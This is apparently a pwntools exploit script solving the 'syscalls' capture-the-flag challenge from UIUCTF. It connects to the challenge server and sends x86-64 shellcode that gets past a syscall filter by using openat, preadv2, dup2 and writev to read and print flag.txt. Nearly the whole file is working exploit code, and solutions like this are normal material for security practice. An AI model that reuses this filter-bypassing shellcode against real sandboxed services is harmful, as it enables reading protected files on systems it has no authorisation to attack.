#!/usr/bin/env python3

from pwn import *

exe = ELF("./syscalls")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("syscalls.chal.uiuc.tf", 1337, ssl=True)

    return r


def main():
    r = conn()

    r.recvuntil(b"I can give you.\n")
    sleep(2)
    shellcode = """
    mov rdi, -100
    lea rsi, [rip + x1]
    mov rdx, 0
    
    mov eax, 257
    syscall

    lea r12, [rsp+24]
    push 60
    push r12

    mov rdi, 3 
    lea rsi, [rsp]
    mov rdx, 1
    mov r10, 0
    xor r8, r8 

    mov eax, 327
    syscall


    mov rdi, 1
    mov rsi, 4294967296
    mov rax, 33
    syscall 

    mov rdi, 4294967296
    lea rsi, [rsp]
    mov rdx, 1
    mov r9, 0
    mov eax, 20
    syscall

    x1:
        .ascii "flag.txt"
    .byte 0
    """
    r.sendline(asm(shellcode))
    r.interactive()


if __name__ == "__main__":
    main()
